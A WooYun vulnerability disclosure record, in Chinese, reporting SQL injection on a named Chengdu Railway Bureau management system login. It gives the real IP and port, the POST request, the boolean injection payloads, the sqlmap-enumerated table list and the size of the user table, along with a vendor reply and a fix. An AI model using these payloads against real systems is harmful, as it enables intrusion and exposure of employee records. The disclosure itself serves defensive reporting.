{"id": 65851, "wybug_id": "wooyun-2015-0137108", "wybug_title": "成都铁路局某系统存在sql注入漏洞可泄漏2万多员工信息", "wybug_corp": "成都铁路局", "wybug_author": "小歪", "wybug_date": "2015-08-28 16:47", "wybug_open_date": "2015-10-12 16:18", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向公众公开  简要描述： 成都铁路局某系统登录页存在sql注入漏洞，可泄漏2万多员工信息 详细说明：  成都铁路局某音视频管理系统，在登录页存在sql注入漏洞，另没有验证码及其他防护，可进行暴力破解，此内容未单独进行测试。登录页提交内容为：\nPOST /admin/userLogin.do HTTP/1.1Host: 123.71.192.123:8085Proxy-Connection: keep-aliveContent-Length: 41Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://123.71.192.123:8085User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://123.71.192.123:8085/admin/userLogin.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=00F0E287607823B395DCB8AB75399A33Connection: closeuser.loginName=admin&user.password=123456\n其中post参数存在sql注入漏洞\nadmin' AND 1=1 AND 'a'='a\n 提示密码错误\nadmin' AND 1=2 AND 'a'='a\n 提示用户不存在使用sqlmap进行测试，可查看当前库多个表\n+--------------------------+| lavdr                    || ocp_admin_privileges     || t_attach                 || t_attach_group           || t_camera_file            || t_car_video              || t_dispatch_dictionary    || t_file                   || t_file_log               || t_line                   || t_line_railway_station   || t_live_record            || t_log                    || t_monitor                || t_organization           || t_person_info            || t_personjob              || t_railway_station        || t_record_device          || t_record_device_1        || t_record_dianwu          || t_role                   || t_role_permission        || t_six_a                  || t_time_record            || t_time_record_dictionary || t_unit                   || t_unit_station           || t_user                   || t_user_permission        || t_user_role              || t_user_theme             |+--------------------------+\n   漏洞证明：  测试为后台数据库为mysql\n\n查看当前数据库\n\n跑表\n+--------------------------+| lavdr                    || ocp_admin_privileges     || t_attach                 || t_attach_group           || t_camera_file            || t_car_video              || t_dispatch_dictionary    || t_file                   || t_file_log               || t_line                   || t_line_railway_station   || t_live_record            || t_log                    || t_monitor                || t_organization           || t_person_info            || t_personjob              || t_railway_station        || t_record_device          || t_record_device_1        || t_record_dianwu          || t_role                   || t_role_permission        || t_six_a                  || t_time_record            || t_time_record_dictionary || t_unit                   || t_unit_station           || t_user                   || t_user_permission        || t_user_role              || t_user_theme             |+--------------------------+\n查看t_user表内容，可以看到用户有22941条内容，数据太多，就不浪费时间了。\n\n仅使用普通用户登录证明一下\n\nwooyun猜想：如果使用admin账户登录，功能是不是更多，会不会拿到shell，会不会系统提权。有兴趣可以告诉我密码~~~   修复方案：  堵住sql注入另外，验证码也加入，错误提示模糊一些便好了。   版权声明：转载请注明来源 小歪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-08-28 16:16 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给四川分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}